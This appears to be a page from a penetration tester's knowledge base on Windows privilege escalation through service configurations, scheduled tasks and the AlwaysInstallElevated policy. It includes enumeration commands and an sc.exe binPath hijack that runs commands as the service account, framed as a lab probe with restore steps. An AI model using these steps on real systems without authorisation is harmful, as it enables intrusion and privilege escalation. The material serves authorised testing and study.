---
title: Windows services and task paths
order: 2
tags: [windows, services, scheduled-tasks, acl, powershell, privesc]
---

Run on the **Windows foothold**. Adapted from [Windows Privilege Escalation](https://app.notion.com/413bbf9f0e7481d8ba18d050982748ce).
Use `sc.exe` explicitly: `sc` can resolve to a PowerShell alias.

## Inventory service execution

```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
sc.exe qc '{{SERVICE}}'
sc.exe sdshow '{{SERVICE}}'
```

Record the service account, full path/arguments, service-object DACL and start/stop
rights. File ACLs and service-control rights are different permissions.
[Microsoft sc.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query).

## Check executable and directory ACLs

```powershell
icacls '{{SERVICE_BINARY}}'
icacls '{{SERVICE_DIRECTORY}}'
Get-Acl -LiteralPath '{{SERVICE_BINARY}}' | Format-List
```

Inspect the caller's effective access including group/deny ACEs, inheritance and
parent-directory control. For an unquoted path, prove a writable candidate in the
actual search sequence and a privileged restart trigger. Spaces alone are not
an exploitable service configuration.
[icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls).

## Verify a changeable service

Only with verified service configuration rights, a suitable service account and
an approved lab trigger. Save the original configuration first. This benign
identity probe can cause a normal service startup failure because `cmd.exe` is
not a service binary; inspect the output file as the execution evidence.

```cmd
sc.exe config "{{SERVICE}}" binPath= "cmd.exe /c whoami > C:\Users\Public\service-identity.txt"
```

Trigger only when stopping/starting this service is appropriate:

```cmd
sc.exe stop "{{SERVICE}}"
sc.exe start "{{SERVICE}}"
type C:\Users\Public\service-identity.txt
```

Restore the original full binary path and arguments, then its original running state:

```cmd
sc.exe config "{{SERVICE}}" binPath= "{{ORIGINAL_BINPATH}}"
```

Record the changed configuration and probe file for cleanup. Do not apply this
procedure to a critical service without a lab-specific recovery path.
[sc config syntax](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config).

## Scheduled task inspection

```powershell
schtasks.exe /query /fo LIST /v
Get-ScheduledTask | Select-Object TaskName,TaskPath,State
```

Trace the action, arguments, working directory, run-as account, trigger and ACLs
of every executable/script/dependency. A writable action without an active trigger
does not establish elevated execution. [schtasks query](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query).

## Installer policy check

Both user and machine AlwaysInstallElevated policy values must be relevant to the
actual install context. Inspect them independently:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

A missing value or only one enabled policy does not complete the path. Review
the chosen MSI's behavior and target installer policy before any lab execution.
[Microsoft AlwaysInstallElevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated).

## Architecture and execution context

```powershell
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
$PSVersionTable
whoami /priv
```

Match binary architecture, runtime, integrity and enabled privilege to the selected
variant. See [token impersonation](windows/windows-privesc#impersonation-escalation)
and [Windows paths](reference/windows-paths) for common failure causes.
